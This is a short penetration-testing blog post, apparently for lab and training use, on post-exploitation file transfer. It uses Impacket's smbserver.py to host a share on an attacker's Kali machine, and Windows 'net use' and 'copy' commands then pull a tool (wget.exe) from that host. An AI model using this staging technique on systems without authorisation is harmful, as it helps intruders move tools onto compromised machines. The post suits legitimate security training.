---
title: SMB transfer using Impacket
date: 2023-06-22 10:00:00 +07:00
tags: [smb, transfer, impacket]
description: File transfer between Kali <> Windows using Impacket SMB server.
---

## The power of Impacket

Often times during a Post-Exploitation phase, the box or an exercise we need to access certain Windows (mostly) machines that **don't** have internet or any way to transfer a file back to our Kali machine.

To help with that we have an awesome suite called [Impacket](https://github.com/fortra/impacket).

_I won't go over the details to install it because it's pretty straight forward and you can just check the github page._

![Some of the Impacket scripts](/assets/img/smb/scripts.png)
_Figure 1: some scripts that impacket have_


#### To create a SMB server:

```bash
python3 smbserver.py share /path/you/want --smb2support
```
We use `--smbsupport` because often times it gives you an error for SMB1.

Example:

```bash
python3 smbserver.py anakin /home/kali/offsec/tools -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Config file parsed
[*] User OFFICE\offsec authenticated successfully
```


#### Connecting to our share

Once the server is estabilished, we go over to the Windows machine and connect back to our share like this:

```bash
C:\>net use \\10.11.0.XXX\anakin 
The command completed successfully.
```

We also can use the option `p:` to create a drive folder which we can have access to. Like this you can drag and drop anything you want inside the shared folder.

```bash
C:\>net use p: \\10.11.0.XXX\anakin 
The command completed successfully.
```

This is very bad for OPSEC so it's not recommended. If you do, consider disconnecting from the driver using the following: `C:\>net use /d \\[host]\[share name]`

#### To transfer file from the command line:

```bash
C:\>copy \\10.11.0.XXX\anakin\wget.exe \users\offsec\desktop\wget.exe
1 file(s) copied.
```

And that's pretty much it! Very quick and simple.


**Happy hacking!**


![kamusari](/assets/img/smb/kamusari.png)
